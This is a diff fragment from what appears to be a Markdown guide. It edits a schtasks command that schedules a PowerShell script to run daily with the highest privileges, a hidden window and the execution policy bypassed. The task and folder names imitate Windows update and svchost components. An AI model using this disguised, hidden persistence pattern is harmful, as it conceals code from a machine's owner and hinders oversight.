@@ -47,8 +47,9 @@ C:\ProgramData\Microsoft\Windows\svchost\WinZipBackup.ps1
 Schedule it (runs daily, completely hidden)
 ```
 schtasks /Create /TN "WindowsUpdateZipSvc" ^
-  /TR "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\svchost\WinZipBackup.ps1" ^
+  /TR "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\arbri\AppData\Local\SystemUpdate\WinZipBackup.ps1" ^
   /SC DAILY /ST 03:00 /RL HIGHEST /F
+
 ```
 
 
